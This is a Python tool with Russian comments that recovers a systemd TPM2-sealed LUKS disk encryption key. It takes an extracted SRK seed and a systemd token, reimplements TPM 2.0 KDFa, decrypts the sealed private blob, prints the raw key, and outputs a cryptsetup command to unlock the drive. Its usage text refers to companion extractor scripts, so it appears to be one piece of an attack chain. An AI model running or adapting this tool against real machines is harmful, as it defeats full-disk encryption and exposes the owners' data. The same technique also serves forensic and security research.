#!/usr/bin/env python3
import struct
import hmac
import hashlib
import base64
import os
import sys
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Константы TPM 2.0
TPM_ALG_SHA256 = 0x000B
TPM_ALG_KEYEDHASH = 0x0008

def kdfa(hash_alg, key, label, context_u, context_v, bits):
    """
    Реализация функции KDFa согласно спецификации TPM 2.0.
    Используется для генерации симметричного ключа шифрования из Seed.
    """
    if hash_alg != TPM_ALG_SHA256: 
        raise ValueError("Only SHA256 supported in this script")
    
    label_bytes = label.encode('utf-8') + b'\x00' # Null-terminated string
    counter = 1
    bits_bytes = struct.pack('>I', bits)
    
    out_key = b''
    bytes_needed = (bits + 7) // 8
    
    while len(out_key) < bytes_needed:
        # Формат: [i]2 || Label || ContextU || ContextV || [L]2
        msg = struct.pack('>I', counter) + label_bytes + context_u + context_v + bits_bytes
        h = hmac.new(key, msg, hashlib.sha256)
        out_key += h.digest()
        counter += 1
        
    return out_key[:bytes_needed]

def usage():
    print("Usage: python3 luks_extractor.py <srk_seed_bin> <systemd_token.json>")
    print("To get srk_seed.bin you need to run srk_extractor.py")
    print("To gen systemd_token.json you need to run sd_extractor.py")

def main():
    srk_seed_file = None
    sd_b64_file = None
    if len(sys.argv) > 1:
        try:
            srk_seed_file = sys.argv[1]
            sd_b64_file = sys.argv[2]
        except IndexError:
            pass
    else:
        if os.path.isfile("srk_seed.bin"):
            srk_seed_file = "srk_seed.bin"
        else:
            print("[!] SRK seed file wan't found.")
            usage()
            return
        
        if os.path.isfile("systemd_token.json"):
            sd_b64_file = "systemd_token.json"
        else:
            print("[!] systemd token file wan't found.")
            usage()
            return
    
    print(f"[*] SRK Seed file: {srk_seed_file}")
    print(f"[*] Systemd token file: {sd_b64_file}")

    try:
        with open(srk_seed_file, 'rb') as file:
            srk_seed = file.read()
        with open(sd_b64_file, 'rb') as file:
            token = json.load(file)
            blob = base64.b64decode(token['tpm2-blob'])
    except Exception as e:
        print(f"An error occured while decoding: {e}")
        sys.exit(1)
        
    print(f"[*] SRK Seed length: {len(srk_seed)} bytes")
    print(f"[*] Blob length: {len(blob)} bytes")
    
    # Systemd сохраняет данные в формате: TPM2B_PRIVATE || TPM2B_PUBLIC
    # Читаем TPM2B_PRIVATE (зашифрованная часть)
    # Первые 2 байта - это размер структуры
    priv_size = struct.unpack('>H', blob[0:2])[0]
    tpm2b_private = blob[0 : 2 + priv_size]
    
    # Читаем TPM2B_PUBLIC (Открытая часть)
    tpm2b_public = blob[2 + priv_size :]
    
    print(f"[*] TPM2B_PRIVATE struct size: {len(tpm2b_private)}")
    print(f"[*] TPM2B_PUBLIC struct size: {len(tpm2b_public)}")
    
    # Восстанавливаем name
    # Name = HashAlg || Hash(TPMT_PUBLIC)
    # Пропускаем первые 2 байта размера TPM2B_PUBLIC, берем тело (TPMT_PUBLIC)
    pub_struct = tpm2b_public[2:] 
    
    # Парсим заголовок Public Area для проверки
    pub_type = struct.unpack('>H', pub_struct[0:2])[0]
    pub_name_alg = struct.unpack('>H', pub_struct[2:4])[0]
    
    if pub_name_alg != TPM_ALG_SHA256:
        raise ValueError("Oopsie. Unsupported algorithm. Only sha256 is supported")

    # TPMT_PUBLIC hash
    name_hash = hashlib.sha256(pub_struct).digest()
    # [AlgID] + [Hash]
    obj_name = struct.pack('>H', pub_name_alg) + name_hash
    
    print(f"[*] Name объекта: {obj_name.hex()}")
    
    # TPM использует KDFa для создания ключа AES из Seed родителя (SRK)
    # Params: Hash=SHA256, Key=SRK_Seed, Label="STORAGE", ContextU=Name, Bits=128
    sym_key = kdfa(
        TPM_ALG_SHA256,
        srk_seed,
        "STORAGE",
        obj_name,
        b'', # ContextV пустой
        128  # 128 бит для AES-128
    )
    
    print(f"[*] Derived symmetric (AES) key: {sym_key.hex()}")
    
    # EXTRACTING CIPHERTEXT
    # Структура TPM2B_PRIVATE:
    # [Size: 2] [IntegritySize: 2] [Integrity: N] [EncryptedPart...]
    # EncryptedPart для AES-CFB родителя:
    # [IV Size: 2] [IV: 16] [Ciphertext...]
    
    cursor = 2
    
    # Пропускаем HMAC
    integrity_size = struct.unpack('>H', tpm2b_private[cursor:cursor+2])[0]
    cursor += 2 + integrity_size
    
    # Читаем IV
    iv_size = struct.unpack('>H', tpm2b_private[cursor:cursor+2])[0]
    cursor += 2
    
    if iv_size != 16:
        raise ValueError(f"Неверный размер IV: {iv_size} (ожидалось 16 байт для AES-128)")
        
    iv = tpm2b_private[cursor : cursor + iv_size]
    cursor += iv_size
    
    # Всё, что осталось - это шифротекст
    ciphertext = tpm2b_private[cursor:]
    
    print(f"[*] IV: {iv.hex()}")
    print(f"[*] Ciphertext size: {len(ciphertext)} bytes")
    
    # ===== DECRYPTION =====

    cipher = Cipher(algorithms.AES(sym_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
    
    print(f"[*] Decryption success.")
    
    # Парсинг расшифрованной структуры (TPMT_SENSITIVE)
    # Структура:
    # [TotalSize: 2] (padding или заголовок?)
    # [SensitiveType: 2]
    # [AuthSize: 2] [AuthData...]
    # [SeedSize: 2] [SeedData...]
    # [SensitiveDataSize: 2] [SensitiveData (KEY)...]
    
    d_cursor = 2
        
    # Проверяем тип
    sens_type = struct.unpack('>H', decrypted_data[d_cursor:d_cursor+2])[0]
    d_cursor += 2
    
    if sens_type != TPM_ALG_KEYEDHASH:
        print(f"Warning. Unknown type: 0x{sens_type:04x}")
    
    # Пропускаем Auth Value (или пустое или PIN hash)
    auth_size = struct.unpack('>H', decrypted_data[d_cursor:d_cursor+2])[0]
    d_cursor += 2 + auth_size
    
    # Пропускаем Seed Value (сид самого объекта)
    seed_size = struct.unpack('>H', decrypted_data[d_cursor:d_cursor+2])[0]
    d_cursor += 2 + seed_size
    
    # Читаем целевые данные (Sensitive Data)
    data_size = struct.unpack('>H', decrypted_data[d_cursor:d_cursor+2])[0]
    d_cursor += 2
    
    recovered_key = decrypted_data[d_cursor : d_cursor + data_size]
    
    print(f"\n[!!!] Raw key extracted ({len(recovered_key)} bytes):")
    print(f"HEX: {recovered_key.hex()}")
    
    # Systemd кодирует эти случайные байты в Base64 перед записью в слот LUKS
    key_b64 = base64.b64encode(recovered_key).decode('utf-8')
    print(f"BASE64: {key_b64}")
    
    print(f"\nUse this command to mount LUKS partition:")
    print(f"printf \"{key_b64}\" | cryptsetup luksOpen /dev/luks_drive decrypted --key-file -")

if __name__ == "__main__":
    main()
